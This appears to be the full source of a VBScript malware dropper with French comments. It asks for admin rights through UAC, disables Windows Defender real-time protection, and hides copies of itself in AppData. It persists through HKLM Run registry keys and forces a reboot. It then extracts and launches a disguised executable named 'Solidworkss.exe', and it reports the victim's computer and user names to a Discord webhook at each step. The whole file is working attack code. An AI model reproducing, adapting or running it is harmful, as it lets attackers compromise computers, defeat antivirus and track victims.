On Error Resume Next
Randomize

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set objShellApp = CreateObject("Shell.Application")
Set WMI = GetObject("winmgmts:\\.\root\cimv2")
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' === WEBHOOK ===
webhookURL = "https://discord.com/api/webhooks/TON_WEBHOOK_ICI"
enableDiscord = False

If webhookURL <> "" Then
    If LCase(Left(webhookURL, 32)) = "https://discord.com/api/webhooks/" Or LCase(Left(webhookURL, 33)) = "https://discordapp.com/api/webhooks/" Then
        enableDiscord = True
    End If
End If

Function SendToDiscord(title, description, color)
    If Not enableDiscord Then Exit Function
    
    On Error Resume Next
    Dim payload
    payload = "{""embeds"":[{""title"":""" & Replace(title, """", "\""") & """,""description"":""" & Replace(description, """", "\""") & """,""color"":" & color & ",""timestamp"":""" & IsoDateTime(Now()) & """}]}"
    
    http.Open "POST", webhookURL, False
    http.SetTimeout 5000, 5000, 10000, 10000  ' Timeout robuste
    http.SetRequestHeader "Content-Type", "application/json"
    http.Send payload
    
    If Err.Number <> 0 Or http.Status < 200 Or http.Status >= 300 Then
        enableDiscord = False
    End If
    
    Err.Clear
    On Error Goto 0
End Function

Function IsoDateTime(dt)
    IsoDateTime = Year(dt) & "-" & Right("0" & Month(dt),2) & "-" & Right("0" & Day(dt),2) & "T" & _
                  Right("0" & Hour(dt),2) & ":" & Right("0" & Minute(dt),2) & ":" & Right("0" & Second(dt),2) & "Z"
End Function

computerName = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
userName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
prefix = "**[" & computerName & " | " & userName & "]**"

vbsPath = WScript.ScriptFullName
vbsDir = fso.GetParentFolderName(vbsPath)

tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
appDataDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft"
startupDir = appDataDir & "\Startup"
hiddenDir = appDataDir & "\WindowsCore"
globalMarker = appDataDir & "\.initlock"
mutexFile = appDataDir & "\.running"

If Not fso.FolderExists(appDataDir) Then fso.CreateFolder appDataDir
If Not fso.FolderExists(startupDir) Then fso.CreateFolder startupDir
If Not fso.FolderExists(hiddenDir) Then fso.CreateFolder hiddenDir

' Mutex PREMIER
If fso.FileExists(mutexFile) Then 
    SendToDiscord "Duplication", prefix & " Instance active → sortie.", 16711680
    WScript.Quit
End If
fso.CreateTextFile mutexFile, True
WshShell.Run "attrib +h +s +r """ & mutexFile & """ >nul 2>&1", 0, False

SendToDiscord "Démarré", prefix & " Exécution.", 65280

zipName = "test1.zip"
zipLocations = Array(tempDir & "\" & zipName, appDataDir & "\" & zipName, hiddenDir & "\" & zipName, startupDir & "\" & zipName)

If fso.FileExists(vbsDir & "\" & zipName) Then
    For Each loc In zipLocations
        On Error Resume Next
        fso.CopyFile vbsDir & "\" & zipName, loc, True
        If fso.FileExists(loc) Then WshShell.Run "attrib +h +s +r """ & loc & """ >nul 2>&1", 0, False
        On Error Goto 0
    Next
    SendToDiscord "ZIP OK", prefix & " Propagée.", 3447003
End If

Function IsElevated()
    On Error Resume Next
    WshShell.RegWrite "HKLM\SOFTWARE\TestElev", 1, "REG_DWORD"
    If Err.Number = 0 Then WshShell.RegDelete "HKLM\SOFTWARE\TestElev"
    IsElevated = (Err.Number = 0)
    Err.Clear
End Function

If Not IsElevated() Then
    SendToDiscord "UAC", prefix & " Demande admin.", 16776960
    objShellApp.ShellExecute "wscript.exe", """" & vbsPath & """", "", "runas", 1
    GoTo Cleanup  ' Sortie propre si refus
End If

SendToDiscord "Admin", prefix & " OK.", 65280

exeName = "Solidworkss.exe"
exeTemp = tempDir & "\" & exeName
exePersist = startupDir & "\" & exeName

On Error Resume Next
Set psExec = WshShell.Exec("powershell.exe -Command ""try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; exit 0 } catch { exit 1 }""")
Do While psExec.Status = 0 : WScript.Sleep 100 : Loop
If psExec.ExitCode = 0 Then SendToDiscord "Defender off", prefix & " Realtime désactivé.", 65280
On Error Goto 0

If Not fso.FileExists(globalMarker) And fso.FileExists(vbsDir & "\" & zipName) Then
    On Error Resume Next
    fso.CreateTextFile globalMarker, True
    WshShell.Run "attrib +h +s +r """ & globalMarker & """ >nul 2>&1", 0, False
    WshShell.Run "shutdown /r /f /t 900 >nul 2>&1", 0, False
    SendToDiscord "Reboot", prefix & " 15 min.", 16776960
    On Error Goto 0
    GoTo Cleanup
End If

vbsCopies = Array(tempDir & "\startup.vbs", appDataDir & "\core.vbs", startupDir & "\persist.vbs", hiddenDir & "\backup.vbs")
copiesMade = 0
For i = 0 To 3
    target = vbsCopies(i)
    If Not fso.FileExists(target) Then
        On Error Resume Next
        fso.CopyFile vbsPath, target, True
        If fso.FileExists(target) Then 
            WshShell.Run "attrib +h +s +r """ & target & """ >nul 2>&1", 0, False
            copiesMade = copiesMade + 1
        End If
        On Error Goto 0
    End If
Next
SendToDiscord "VBS copies", prefix & copiesMade & "/4.", 3447003

validVbs = ""
For Each cp In vbsCopies
    If fso.FileExists(cp) Then validVbs = cp : Exit For
Next
If validVbs <> "" And fso.FileExists(validVbs) Then
    On Error Resume Next
    currentRun = WshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VbsPersist")
    If currentRun <> "wscript.exe //B """ & validVbs & """" Then
        WshShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VbsPersist"
        WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VbsPersist", "wscript.exe //B """ & validVbs & """", "REG_SZ"
        SendToDiscord "VBS persist", prefix & " OK.", 65280
    End If
    On Error Goto 0
End If

counter = 0
Do While counter < 80
    counter = counter + 1

    ' Détection renforcée
    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
    If procs.Count = 0 Then
        Set fallback = WshShell.Exec("tasklist /FI ""IMAGENAME eq " & exeName & """")
        Do While fallback.Status = 0 : WScript.Sleep 50 : Loop
        If InStr(fallback.StdOut.ReadAll, exeName) > 0 Then procs.Count = 1
    End If
    If procs.Count > 0 Then 
        SendToDiscord "Payload running", prefix & " Actif.", 65280
        GoTo Cleanup
    End If

    sourceZip = ""
    For Each loc In zipLocations
        If fso.FileExists(loc) Then sourceZip = loc : Exit For
    Next

    If sourceZip <> "" Then
        On Error Resume Next
        Set extractExec = WshShell.Exec("powershell.exe -Command ""try { Expand-Archive -LiteralPath '" & sourceZip & "' -DestinationPath '" & tempDir & "' -Force; exit 0 } catch { exit 1 }""")
        Do While extractExec.Status = 0 : WScript.Sleep 200 : Loop
        extractOK = (extractExec.ExitCode = 0)
        On Error Goto 0

        If extractOK And fso.FileExists(exeTemp) Then
            fileSize = fso.GetFile(exeTemp).Size
            If fileSize > 50000 And Left(fso.OpenTextFile(exeTemp, 1).Read(2), 2) = "MZ" Then  ' PE header check
                SendToDiscord "Extraction validée", prefix & fileSize \ 1024 & " KB.", 3447003
                fso.CopyFile exeTemp, exePersist, True
                If fso.FileExists(exePersist) Then WshShell.Run "attrib +h +s +r """ & exePersist & """ >nul 2>&1", 0, False

                If fso.FileExists(exeTemp) Then
                    On Error Resume Next
                    currentExe = WshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ExePersist")
                    If currentExe <> """" & exeTemp & """" Then
                        WshShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ExePersist"
                        WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ExePersist", """" & exeTemp & """", "REG_SZ"
                        SendToDiscord "EXE persist", prefix & " OK.", 65280
                    End If
                    On Error Goto 0
                End If

                WshShell.Run """" & exeTemp & """", 0, False
                SendToDiscord "Payload lancé", prefix & " Démarré.", 65280
                GoTo Cleanup
            End If
        End If
    End If

    WScript.Sleep 10000 + Int(Rnd * 20000)  ' 10-30s réactif
Loop

SendToDiscord "Fin", prefix & " Terminé.", 8421504

Cleanup:
On Error Resume Next
fso.DeleteFile mutexFile
SendToDiscord "Clean", prefix & " Mutex supprimé.", 8421504
On Error Goto 0
